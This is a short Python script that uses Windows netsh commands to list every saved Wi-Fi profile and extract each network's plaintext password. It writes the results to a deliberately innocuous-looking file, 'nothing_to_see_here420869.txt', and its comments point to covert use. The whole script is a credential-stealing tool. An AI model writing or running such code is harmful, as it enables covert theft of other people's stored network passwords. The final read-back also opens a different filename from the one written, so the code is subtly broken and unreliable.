import subprocess
import re

wifi_list = []
#this list will store the passwords and name of wifi temporalily
cmd_output1 = subprocess.run(
    ["netsh", "wlan", "show", "profiles"], 
    capture_output = True, 
    text = True
    )
#this runs the command to show all the saved profiles
outputs = re.findall(r"All User Profile\s*:\s*(.+)", 
                    cmd_output1.stdout,
                    )

#this picks out all the profile names only 

for output in outputs:

    wifi_dic = {}
#All the wifi names and passwords are saved in thiss dictionary
    wifi_name = re.sub(r'[\[\]"]', '', output.strip())
#Strips the brackets
    cmdoutput2 = subprocess.run(
        ['netsh', 'wlan', 'show', 'profile', f'{wifi_name}', 'key=clear'],
        capture_output=True
        ).stdout.decode()
#this runs the command to show all the wifi passwords of each profile
    
    password = re.search("Key Content            : (.*)\r", cmdoutput2) 
#Picks out just the passwords of each profile   
    if password == None:
        wifi_dic[wifi_name] = None
    else:
        wifi_dic[wifi_name] = password[1]
    wifi_list.append(wifi_dic)        
#Appends the wifi names and passwords to wifi_dic
with open ('nothing_to_see_here420869.txt', 'w') as f:
    f.write(str(wifi_list))
#it makes a file and writes the passwords in

#the part below is to make sure its working. delete it when using
with open ('nothing_to_see_here.txt') as f:
    print(f.read())

        
    

